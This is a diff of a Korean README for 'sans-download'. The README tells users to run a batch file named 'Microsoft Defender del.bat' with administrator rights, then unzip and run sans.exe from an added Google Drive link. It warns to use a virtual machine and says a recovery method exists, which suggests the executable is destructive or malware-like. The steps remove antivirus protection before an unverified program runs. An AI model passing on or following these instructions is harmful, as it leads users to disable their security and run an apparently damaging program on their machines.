@@ -1,10 +1,11 @@
 # sans-download
-//*현재 배타 버전 입니다! 제가 테스트 해본 결과 버그가 매우 많습니다!*//
 
 사용 방법⬇️
 
 1.Microsoft Defender del.bat을 관리자 권한으로 실행한다.
 2.sans.zip의 압축을 풀고 안에 있는 sans.exe를 실행한다. (폴더 안에 있는 파일을 옮겨서는 안된다.)
+
+*다운은 https://drive.google.com/file/d/1op_IEwEJVRcm54yajAecURJljIR0cjHL/view?usp=drive_link 여기에서!
 
 ⚠️가상머신에서 실행 하세요. 물론 복구 방법도 있습니다. 
 
